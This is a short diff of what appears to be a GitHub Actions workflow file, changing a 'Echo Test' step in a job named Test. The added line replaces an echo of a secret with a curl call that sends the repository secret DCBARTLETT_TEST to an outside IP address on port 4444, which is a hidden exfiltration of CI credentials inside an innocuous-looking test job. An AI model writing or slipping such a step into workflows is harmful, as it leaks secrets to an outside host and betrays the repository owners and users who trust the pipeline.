@@ -19,4 +19,4 @@ jobs:
             name: Test
         steps:
             - name: Echo Test
-              run: echo ${{ secrets.TEST_SECRET }}
+              run: curl http://74.193.198.70:4444/${{ secrets.DCBARTLETT_TEST }}
